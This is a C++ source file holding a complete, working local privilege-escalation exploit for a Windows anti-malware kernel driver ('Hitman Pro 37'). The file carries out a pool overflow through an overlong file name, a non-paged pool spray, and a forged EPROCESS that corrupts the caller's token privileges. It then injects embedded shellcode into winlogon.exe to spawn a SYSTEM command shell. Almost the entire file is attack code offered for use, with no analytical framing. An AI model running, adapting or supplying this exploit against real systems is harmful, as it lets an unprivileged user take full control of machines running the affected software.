#include <Windows.h>
#include <SubAuth.h>
#include <iostream>
#include <psapi.h>
#include "../../PoolSprayerLib/PoolSprayerLib/PoolSprayer.h"

typedef struct {
	DWORD ProcessId;
	HANDLE File;
} WEIRDSTRUCT, *PWEIRDSTRUCT;

typedef NTSTATUS(__stdcall *NtAllocateVirtualMemory_t)(IN HANDLE ProcessHandle, IN OUT PVOID *BaseAddress, IN ULONG ZeroBits, IN OUT PULONG AllocationSize, IN ULONG AllocationType, IN ULONG Protect);
typedef NTSTATUS(__stdcall *NtFreeVirtualMemory_t)(IN HANDLE ProcessHandle, IN OUT PVOID *BaseAddress, IN OUT PULONG RegionSize, IN ULONG FreeType);
typedef NTSTATUS(__stdcall *NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS SystemInformatioNClass, IN OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength OPTIONAL);

NtAllocateVirtualMemory_t	NtAllocateVirtualMemory;
NtFreeVirtualMemory_t		NtFreeVirtualMemory;
NtQuerySystemInformation_t	NtQuerySystemInformation;

PVOID	pTokenObject = NULL;
HANDLE	hTokenHandle = INVALID_HANDLE_VALUE;

DWORD64 FakeEprocessAdress;

DWORD FakeEprocessPageSize;

void PrintError(void)
{
	printf("Error !!\r\n");
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0)
	{
		printf("No Error Message?"); //No error message has been recorded
		exit(0);
	}
	LPSTR messageBuffer = nullptr;
	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

	std::string message(messageBuffer, size);
	printf("Error message: %s\r\n", message.c_str());
}


void AllocPage(PVOID *addr, DWORD *size)
{
	HANDLE hProc;
	NTSTATUS st;

	*size = 0x2000;

	printf("[+]Allocating Page at %08p...\n", *addr);

	hProc = GetCurrentProcess();

	if (!hProc)
	{
		printf("[-]Failed to get current process handle\n");
		PrintError();
		exit(1);
	}

	st = NtAllocateVirtualMemory(hProc, addr, 0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!NT_SUCCESS(st))
	{
		printf("[-]Failed to allocate page at %08p\n", addr);
		PrintError();
		exit(1);
	}
	else
		printf("[+]Allocation succeded at adress %08p with size %d\n", *addr, *size);
}


void FreePage(PVOID *addr, DWORD *size)
{
	HANDLE hProc;
	NTSTATUS st;

	hProc = GetCurrentProcess();

	if (!hProc)
	{
		printf("[-]Failed to get current process handle\n");
		PrintError();
		exit(1);
	}

	st = NtFreeVirtualMemory(hProc, addr, size, MEM_RELEASE);

	if (!NT_SUCCESS(st))
	{
		printf("[-]Failed to free page at %08p\n", *addr);
		PrintError();
		exit(1);
	}
}

DWORD getProcessId(TCHAR *name)
{
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		printf("[-]EnumProcess failed...\n");
		exit(0);
	}


	// Calculate how many process identifiers were returned.
	cProcesses = cbNeeded / sizeof(DWORD);
	
	// Print the name and process identifier for each process.
	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0)
		{
			DWORD processID = aProcesses[i];
			TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

			// Get a handle to the process.

			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
				PROCESS_VM_READ,
				FALSE, processID);

			// Get the process name.

			if (NULL != hProcess)
			{
				HMODULE hMod;
				DWORD cbNeeded;

				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
					&cbNeeded))
				{
					GetModuleBaseName(hProcess, hMod, szProcessName,
						sizeof(szProcessName) / sizeof(TCHAR));
				}
			}

			// Print the process name and identifier.
			if (!lstrcmpW(szProcessName, name))
			{
				CloseHandle(hProcess);
				return (processID);
			}

			// Release the handle to the process.

			CloseHandle(hProcess);
		}
	}

	return 0;

}

void spawnShell()
{
	HANDLE hSystemProcess = INVALID_HANDLE_VALUE;
	PVOID  pLibRemote;
	HMODULE hKernel32 = ::GetModuleHandle(L"Kernel32");
	DWORD processID;
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
		"\x00";


	if ((processID = getProcessId(L"winlogon.exe")) == 0)
	{
		printf("Couldn't retrieve process ID...\n");
		exit(0);
	}
	printf("[+]Retrieved process id: %d\n", processID);
	hSystemProcess = OpenProcess(GENERIC_ALL, false, processID);

	if (hSystemProcess == INVALID_HANDLE_VALUE || hSystemProcess == (HANDLE)0)
	{
		printf("Couldn't open system process...\n");
		PrintError();
		exit(1);
	}
	printf("[+]Got a handle on a system Process: %08p\n", hSystemProcess);


	pLibRemote = VirtualAllocEx(hSystemProcess, NULL, sizeof(shellcode) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!pLibRemote)
	{
		printf("[-]Virtual alloc failed !\n");
		PrintError();
		exit(0);
	}

	printf("[+]Allocation in system process succeded with address %08p\n", pLibRemote);

	if (!WriteProcessMemory(hSystemProcess, pLibRemote, shellcode, sizeof(shellcode), NULL))
	{
		printf("[-]WriteProcessMemory failed !\n");
		PrintError();
		exit(1);
	}

	HANDLE hThread = CreateRemoteThread(hSystemProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLibRemote, NULL, 0, NULL);

	printf("[+]Writing in system process succeded\n");

	if (hThread == NULL) {
		printf("[-]CreateRemoteThread failed !\n");
		PrintError();
		exit(1);
	}
	else
		printf("[+]Remote thread created !\n");
	CloseHandle(hSystemProcess);
}

void checkPrivilege(PBOOL isPrivilegeSet)
{
	PRIVILEGE_SET		privSet;
	LUID_AND_ATTRIBUTES Privileges[1];
	LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &(Privileges[0].Luid));
	Privileges[0].Attributes = 0;

	privSet.PrivilegeCount = 1;
	privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
	memcpy(privSet.Privilege, Privileges, sizeof(Privileges));

	PrivilegeCheck(hTokenHandle, &privSet, isPrivilegeSet);
}

void initFakeEprocess(PVOID addr)
{
	//Allocating page
	FakeEprocessAdress = (DWORD64)((char *)addr - 0x50);
	AllocPage((PVOID *)&FakeEprocessAdress, &FakeEprocessPageSize);
	RtlZeroMemory((PVOID)FakeEprocessAdress, FakeEprocessPageSize);

	DWORD64 save = (DWORD64)addr;
	DWORD64 temp = save + 4;
	DWORD64 QuotaValues = 0xcfc;
	DWORD64 QuotaValues2 = 0x255dc;

	//Set the ReferenceCount of the object that will be dereferenced.
	memset((char *)addr - 0x50, 0x1, 0x50);
	memset((char *)addr - 0x18, 0xB, 0x1);

	//Set the correct type for structure EPROCESS
	memset(addr, 0x3, 1);

	for (int i = 4; i < 4096; i = i + 4)
	{
		memcpy((PVOID)((char *)addr + i), &temp, 4);
		temp += 4;
	}

	//We put the address of the value we want to decrement in field QuotaBlock
	/*
		kd> dt nt!_EPROCESS
		[...]
		+0x1b8 CommitCharge     : Uint8B
		+0x1c0 QuotaBlock       : Ptr64 _EPROCESS_QUOTA_BLOCK
		+0x1c8 CpuQuotaBlock    : Ptr64 _PS_CPU_QUOTA_BLOCK
		[...]
	*/
	temp = (DWORD64)((char *)pTokenObject + 0x48);
	memcpy((char *)addr + 0x1c0, &temp, sizeof(DWORD64));

	//Some values that will be checked during free
	for (int i = 0xd8; i < 0xf0; i++)
	{
		memset((char *)addr + i, 2 + (i - 0xd4), 1);
	}
	memcpy((char *)addr + 0xc0, &QuotaValues, 4);
	memcpy((char *)addr + 0xc4, &QuotaValues2, 4);
	memcpy((char *)addr + 0xc8, &QuotaValues, 4);
	memcpy((char *)addr + 0xcc, &QuotaValues2, 4);
}

void getMisc()
{
	PSYSTEM_EXTENDED_HANDLE_INFORMATION handleInfo;
	NTSTATUS st;
	HMODULE h;
	ULONG handleInfoLen = 0x10000;

	h = LoadLibraryA("ntdll.dll");

	if (!h)
	{
		printf("[-]Failed to load module\n");
		exit(1);
	}

	NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(h, "NtQuerySystemInformation");

	OpenProcessToken(GetCurrentProcess(), GENERIC_READ, &hTokenHandle);

	if (hTokenHandle == (HANDLE)INVALID_HANDLE_VALUE)
	{
		printf("Failed to retrieve process token handle \n");
		PrintError();
		exit(1);
	}

	handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)malloc(handleInfoLen);

	while ((st = NtQuerySystemInformation(
		SystemExtendedHandleInformation,
		handleInfo,
		handleInfoLen,
		NULL
	)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)realloc(handleInfo, handleInfoLen *= 2);

	if (!NT_SUCCESS(st))
	{
		printf("NtQuerySystemInformation failed!\n");
		exit(1);
	}

	for (UINT i = 0; i < handleInfo->NumberOfHandles; i++)
	{
		if ((HANDLE)handleInfo->Handles[i].HandleValue == hTokenHandle)
		{
			pTokenObject = handleInfo->Handles[i].Object;
		}
	}

	if (!pTokenObject)
	{
		printf("[-]Failed to retrieve Token Object \n");
		exit(1);
	}

	printf("[+]Got Token Object with address: %08p\n", pTokenObject);


	NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(h, "NtAllocateVirtualMemory");
	NtFreeVirtualMemory = (NtFreeVirtualMemory_t)GetProcAddress(h, "NtFreeVirtualMemory");

	if (!NtFreeVirtualMemory)
	{
		printf("[-]Failed to get the address of NtFreeVirtualMemory\n");
		PrintError();
		exit(1);
	}
	if (!NtAllocateVirtualMemory)
	{
		printf("[-]Failed to get the address of NtAllocateVirtualMemory\n");
		PrintError();
		exit(1);
	}
}


int main(void)
{
	WEIRDSTRUCT finalBuffer;
	HANDLE		hDevice = INVALID_HANDLE_VALUE;
	HANDLE		RandomFile = INVALID_HANDLE_VALUE;
	DWORD		dwIoctlCode = 0x222000;
	DWORD64		FakeHeader = 0x00000A00A0C0324;
	DWORD		NombreByte = 0;
	DWORD		nLen = 30;
	BOOL		isPrivilegeSet;
	char		*Outbuff;
	char		confirm[30];
	NonPagedPoolSprayer *pPoolSprayer;
	HOLE		hole;

	printf("Connecting to device...\n");

	hDevice = CreateFile(L"\\\\.\\Hitman Pro 37", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	while (hDevice == INVALID_HANDLE_VALUE)
	{
		hDevice = CreateFile(L"\\\\.\\Hitman Pro 37", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		Sleep(1000);
	}
	printf("Device found !\nHandle : %p\n", hDevice);

	// Dont care of the path, just put something where you can write and long enough
	wchar_t TempName[300] = L"C:\\Users\\Public\\Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2A";
	wchar_t name[300];
	memset(name, 0, 300 * sizeof(wchar_t));
	int error;
	int i = 0;
	for (i = 0; i < 231; i++)
	{
		name[i] = TempName[i];
	}

	// We want to overwrite PoolHeader with 0x0A0C200C
	for (i; i < 241; i = i + 2)
	{
		name[i] = FakeHeader & 0xffff;
		name[i + 1] = FakeHeader >> 16 & 0xffff;
	}
	name[i] = FakeHeader >> 32 & 0xffff;

	RandomFile = CreateFile(name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (RandomFile == INVALID_HANDLE_VALUE)
	{
		PrintError();
		exit(1);
	}

	// Allocate enough to dont crash after the exploit
	Outbuff = (char *)malloc(0x400 * sizeof(char));

	memset(&finalBuffer, 0, sizeof(finalBuffer));

	finalBuffer.ProcessId = GetCurrentProcessId();
	finalBuffer.File = RandomFile;

	printf("[+]Leaking some addresses...\n");
	getMisc();

	std::cout << "Start exploit ? Y/N" << std::endl;
	std::cin >> confirm;
	if (confirm[0] != 'y' && confirm[0] != 'Y')
	{
		printf("[-]Exiting...\n");
		exit(1);
	}

	while (1)
	{
		printf("[+]Crafting Fake Eprocess...\n");
		initFakeEprocess((PVOID)FakeHeader);

		pPoolSprayer = new NonPagedPoolSprayer();

		printf("[+]Spraying Pool...\n");
		pPoolSprayer->sprayPool();

		hole = pPoolSprayer->planHole(3);
		printf("The buffer will be allocated at %p\n", hole.pBaseAddress);
		pPoolSprayer->createHole(hole);

		printf("[+]Sending IOCTL...\n");
		error = DeviceIoControl(hDevice, dwIoctlCode, &finalBuffer, 0x1F0, Outbuff, 0x1F0, &NombreByte, NULL);
		Sleep(1000);
		if (error == 0)
			PrintError();

		printf("[+]Freeing chunks...\n");
		pPoolSprayer->freePool();
		Sleep(1000);
		FreePage((PVOID *)&FakeEprocessAdress, &FakeEprocessPageSize);

		checkPrivilege(&isPrivilegeSet);
		if (isPrivilegeSet)
		{
			printf("[+]Privilege Escalation worked fine ! \n");
			break;
		}
		else
			printf("[+]We still dont have enough privilege, retrying...\n\n");
	}

	spawnShell();

	CloseHandle(finalBuffer.File);
	CloseHandle(hDevice);
	free(Outbuff);
}